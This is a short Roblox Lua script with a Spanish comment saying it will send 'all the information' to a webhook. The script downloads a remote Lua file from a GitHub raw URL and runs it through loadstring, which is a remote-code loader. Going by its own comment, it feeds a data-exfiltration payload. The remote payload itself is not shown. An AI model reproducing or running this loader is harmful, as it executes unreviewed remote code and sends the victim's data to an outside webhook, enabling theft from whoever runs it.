ESTE SCRIPT SE EJECUTARA PARA QUE SE ENVIE TODA LA INFORMACION ALA WEBHOOK

local success, webhookFunc = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/ssshlx/render/main/webhook.lua"))
end)

if success then
    local func = webhookFunc()
else
    warn("Error:", webhookFunc)
end
